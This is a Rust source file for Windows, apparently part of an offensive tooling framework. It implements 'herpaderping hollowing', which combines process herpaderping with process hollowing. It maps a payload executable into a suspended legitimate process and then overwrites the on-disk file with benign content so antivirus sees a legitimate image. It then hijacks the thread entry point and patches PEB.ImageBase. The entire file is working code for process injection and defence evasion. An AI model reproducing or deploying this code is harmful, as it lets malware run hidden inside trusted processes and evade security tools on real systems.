use std::ffi::CString;
use std::path::Path;

use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FlushFileBuffers, ReadFile, SetEndOfFile, SetFilePointer, WriteFile,
    FILE_ATTRIBUTE_NORMAL, FILE_BEGIN, FILE_SHARE_DELETE, FILE_SHARE_READ, FILE_SHARE_WRITE,
    OPEN_EXISTING,
};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Threading::{
    CreateProcessW, ResumeThread, TerminateProcess, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTUPINFOW,
};

use crate::error::MiscError;

/// Herpaderping Hollowing: combines process herpaderping with process hollowing.
///
/// Algorithm:
/// 1. Read payload PE into memory, validate PE32+ (64-bit), extract entry point RVA
/// 2. Create temp file, open with GENERIC_READ|GENERIC_WRITE and full sharing
/// 3. Write payload bytes to temp file via WriteFile + FlushFileBuffers + SetEndOfFile
/// 4. Create SEC_IMAGE section from temp file via NtCreateSection
/// 5. Create legitimate host process SUSPENDED via CreateProcessW (using legit_img path)
/// 6. Map the herpaderped section into the suspended process via NtMapViewOfSection
/// 7. **Overwrite** temp file with legitimate PE content (the "herpaderp") — AV/OS sees legit PE on disk
/// 8. Close file handles
/// 9. Hijack thread: set RCX to mapped_base + entry_point_rva, patch PEB.ImageBase
/// 10. Resume thread — payload executes inside the legitimate process
///
/// Returns the PID of the herpaderping-hollowed process on success.
///
/// # Arguments
/// * `pe_path` - Path to the payload PE executable (64-bit)
/// * `legit_img` - Path to a legitimate PE (used as the host process AND to overwrite temp file on disk)
pub fn herpaderp_hollow_process(pe_path: &str, legit_img: &str) -> Result<u32, MiscError> {
    // Validate both files exist
    if !Path::new(pe_path).exists() {
        return Err(MiscError::FileNotFound(pe_path.to_string()));
    }
    if !Path::new(legit_img).exists() {
        return Err(MiscError::FileNotFound(legit_img.to_string()));
    }

    // Read payload PE file
    let payload_data = std::fs::read(pe_path)
        .map_err(|_| MiscError::FileReadFailed(pe_path.to_string()))?;

    // Validate PE header basics
    if payload_data.len() < 64 {
        return Err(MiscError::InvalidPE(
            "File too small for DOS header".into(),
        ));
    }
    let dos_magic = u16::from_le_bytes([payload_data[0], payload_data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset =
        u32::from_le_bytes([payload_data[60], payload_data[61], payload_data[62], payload_data[63]])
            as usize;
    if payload_data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE(
            "File too small for PE signature".into(),
        ));
    }
    let pe_sig = u32::from_le_bytes([
        payload_data[pe_offset],
        payload_data[pe_offset + 1],
        payload_data[pe_offset + 2],
        payload_data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // Check PE32+ (64-bit)
    let coff_offset = pe_offset + 4;
    if payload_data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE(
            "File too small for COFF header".into(),
        ));
    }
    let opt_offset = coff_offset + 20;
    if payload_data.len() < opt_offset + 20 {
        return Err(MiscError::InvalidPE(
            "File too small for optional header".into(),
        ));
    }
    let opt_magic = u16::from_le_bytes([payload_data[opt_offset], payload_data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::ArchMismatch(
            "Only PE32+ (64-bit) executables are supported for herpaderping hollowing".into(),
        ));
    }

    // Get entry point RVA
    let entry_point_rva = u32::from_le_bytes([
        payload_data[opt_offset + 16],
        payload_data[opt_offset + 17],
        payload_data[opt_offset + 18],
        payload_data[opt_offset + 19],
    ]);

    if entry_point_rva == 0 {
        return Err(MiscError::InvalidPE("Entry point RVA is zero".into()));
    }

    unsafe {
        // Resolve NT functions from ntdll
        let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())).map_err(|_| {
            MiscError::HerpaderpHollowFailed("Failed to get ntdll.dll handle".into())
        })?;

        let get_proc = |name: &str| -> Result<*const (), MiscError> {
            let cname = CString::new(name).unwrap();
            GetProcAddress(ntdll, PCSTR(cname.as_ptr() as *const u8))
                .map(|p| p as *const ())
                .ok_or_else(|| {
                    MiscError::HerpaderpHollowFailed(format!("Failed to resolve {}", name))
                })
        };

        // ---- Function type definitions ----

        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut HANDLE,
            u32,
            *mut std::ffi::c_void,
            *mut i64,
            u32,
            u32,
            HANDLE,
        ) -> i32;

        type NtMapViewOfSectionFn = unsafe extern "system" fn(
            HANDLE,
            HANDLE,
            *mut *mut std::ffi::c_void,
            usize,
            usize,
            *mut i64,
            *mut usize,
            u32,
            u32,
            u32,
        ) -> i32;

        type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE,
            *mut std::ffi::c_void,
            *const std::ffi::c_void,
            usize,
            *mut usize,
        ) -> i32;

        // ---- Resolve NT functions ----
        let nt_create_section: NtCreateSectionFn =
            std::mem::transmute(get_proc("NtCreateSection")?);
        let nt_map_view_of_section: NtMapViewOfSectionFn =
            std::mem::transmute(get_proc("NtMapViewOfSection")?);
        let nt_write_virtual_memory: NtWriteVirtualMemoryFn =
            std::mem::transmute(get_proc("NtWriteVirtualMemory")?);

        // ==== Step 1: Create temp file and write payload ====

        let unique_id = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let temp_filename = format!("HH_{:X}.tmp", unique_id);
        let temp_path = std::env::temp_dir().join(&temp_filename);
        let temp_path_str = temp_path.to_string_lossy().to_string();

        // Create empty temp file first
        std::fs::File::create(&temp_path).map_err(|_| {
            MiscError::HerpaderpHollowFailed("Failed to create temp file".into())
        })?;

        // Open with CreateFileW for GENERIC_READ | GENERIC_WRITE with full sharing
        let tmp_wide: Vec<u16> = temp_path_str
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let h_tmp_file = CreateFileW(
            windows::core::PCWSTR(tmp_wide.as_ptr()),
            0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|_| {
            let _ = std::fs::remove_file(&temp_path);
            MiscError::HerpaderpHollowFailed("CreateFileW failed for temp file".into())
        })?;

        // Write payload PE to temp file
        let mut bytes_written: u32 = 0;
        if WriteFile(h_tmp_file, Some(&payload_data), Some(&mut bytes_written), None).is_err() {
            let _ = CloseHandle(h_tmp_file);
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::HerpaderpHollowFailed(
                "WriteFile failed for payload".into(),
            ));
        }

        let _ = FlushFileBuffers(h_tmp_file);
        let _ = SetEndOfFile(h_tmp_file);

        // ==== Step 2: Create SEC_IMAGE section from temp file ====

        let mut section_handle = HANDLE::default();
        let status = nt_create_section(
            &mut section_handle,
            0xF001F, // SECTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,      // PAGE_READONLY
            0x1000000, // SEC_IMAGE
            h_tmp_file,
        );

        if status != 0 {
            let _ = CloseHandle(h_tmp_file);
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::HerpaderpHollowFailed(format!(
                "NtCreateSection failed with status 0x{:08X}",
                status
            )));
        }

        // ==== Step 3: Create legitimate host process SUSPENDED ====

        let legit_img_str = legit_img.to_string();
        let mut cmd_wide: Vec<u16> = legit_img_str
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        // Extract directory from legit_img path for working directory
        // Remove any command-line args: find ".exe" and take path up through it
        let legit_exe_path = if let Some(pos) = legit_img.to_lowercase().find(".exe") {
            &legit_img[..pos + 4]
        } else {
            legit_img
        };
        let legit_dir = Path::new(legit_exe_path)
            .parent()
            .unwrap_or(Path::new("C:\\"))
            .to_string_lossy()
            .to_string();
        let legit_dir_wide: Vec<u16> = legit_dir
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let create_result = CreateProcessW(
            None,
            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            true,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            None,
            windows::core::PCWSTR(legit_dir_wide.as_ptr()),
            &startup_info,
            &mut process_info,
        );

        if create_result.is_err() {
            let _ = CloseHandle(section_handle);
            let _ = CloseHandle(h_tmp_file);
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::CreateProcessFailed(format!(
                "CreateProcessW failed for host {}",
                legit_img
            )));
        }

        let process_handle = process_info.hProcess;
        let thread_handle = process_info.hThread;
        let pid = process_info.dwProcessId;

        let cleanup = |ph: HANDLE, th: HANDLE| {
            let _ = TerminateProcess(ph, 1);
            let _ = CloseHandle(th);
            let _ = CloseHandle(ph);
        };

        // ==== Step 4: Map herpaderped section into suspended process ====

        let mut base_address: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;

        let status = nt_map_view_of_section(
            section_handle,
            process_handle,
            &mut base_address,
            0,                    // ZeroBits
            0,                    // CommitSize
            std::ptr::null_mut(), // SectionOffset
            &mut view_size,
            1,    // ViewShare
            0,    // AllocationType
            0x02, // PAGE_READONLY
        );

        let _ = CloseHandle(section_handle);

        if status != 0 {
            cleanup(process_handle, thread_handle);
            let _ = CloseHandle(h_tmp_file);
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::HerpaderpHollowFailed(format!(
                "NtMapViewOfSection failed with status 0x{:08X}",
                status
            )));
        }

        // ==== Step 5: Overwrite temp file with legit PE (the "herpaderp") ====

        // Open the legit PE file for reading
        let legit_exe_wide: Vec<u16> = legit_exe_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let h_legit_file = CreateFileW(
            windows::core::PCWSTR(legit_exe_wide.as_ptr()),
            0x80000000, // GENERIC_READ
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        );

        match h_legit_file {
            Ok(h_legit) => {
                // Get file size
                let legit_size =
                    windows::Win32::Storage::FileSystem::GetFileSize(h_legit, None);

                if legit_size != u32::MAX {
                    let mut legit_buf = vec![0u8; legit_size as usize];
                    let mut bytes_read: u32 = 0;
                    let read_ok =
                        ReadFile(h_legit, Some(&mut legit_buf), Some(&mut bytes_read), None);

                    if read_ok.is_ok() && bytes_read == legit_size {
                        // Reset temp file pointer to beginning
                        SetFilePointer(h_tmp_file, 0, None, FILE_BEGIN);

                        // Write legit PE content over the payload
                        let mut legit_written: u32 = 0;
                        let _ = WriteFile(
                            h_tmp_file,
                            Some(&legit_buf),
                            Some(&mut legit_written),
                            None,
                        );
                        let _ = FlushFileBuffers(h_tmp_file);
                        let _ = SetEndOfFile(h_tmp_file); // Truncate to legit PE size
                    }
                }

                let _ = CloseHandle(h_legit);
            }
            Err(_) => {
                // Non-fatal: overwrite failed but process is already created
            }
        }

        // Close temp file handle
        let _ = CloseHandle(h_tmp_file);

        // ==== Step 6: Hijack thread execution ====

        // Get thread context — Rdx holds the PEB address
        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL_AMD64;

        if GetThreadContext(thread_handle, &mut context).is_err() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::GetContextFailed);
        }

        // Set RCX to entry point in mapped section (thread hijacking)
        context.Rcx = base_address as u64 + entry_point_rva as u64;

        if SetThreadContext(thread_handle, &context).is_err() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::SetContextFailed);
        }

        // Patch PEB.ImageBase (offset 0x10 from PEB at Context.Rdx)
        // Use NtWriteVirtualMemory like the reference code
        let peb_image_base_addr = (context.Rdx + 0x10) as *mut std::ffi::c_void;
        let new_image_base = base_address as u64;
        let mut bw: usize = 0;

        let status = nt_write_virtual_memory(
            process_handle,
            peb_image_base_addr,
            &new_image_base as *const _ as *const _,
            std::mem::size_of::<u64>(),
            &mut bw,
        );

        if status != 0 {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::PebReadFailed);
        }

        // ==== Step 7: Resume thread ====

        let resume_result = ResumeThread(thread_handle);
        if resume_result == u32::MAX {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::ResumeThreadFailed(process_info.dwThreadId));
        }

        // Clean up handles
        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(pid)
    }
}
